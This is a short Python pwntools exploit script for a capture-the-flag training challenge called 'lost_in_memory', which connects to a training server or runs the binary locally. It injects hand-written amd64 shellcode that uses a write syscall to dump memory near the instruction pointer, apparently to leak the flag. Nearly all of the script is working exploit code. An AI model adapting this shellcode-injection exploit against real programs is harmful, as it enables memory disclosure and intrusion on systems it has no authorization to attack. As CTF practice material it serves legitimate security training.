from pwn import *

context.arch = 'amd64'
COMMAND = """
brva 0xA42
c 
"""

if args.REMOTE:
    p = remote("lost-in-memory.training.offensivedefensive.it", 8080, ssl=True)
elif args.GDB:
    p = gdb.debug("./lost_in_memory", gdbscript=COMMAND)
else:
    p = process("./lost_in_memory")
    
shellcode = asm("""
lea rax, [rip]
sub rax, 0x6e
mov rsi, rax
mov rdx, 100
mov rax, 1
mov rdi, 1
syscall
""")

p.send(shellcode)
p.interactive()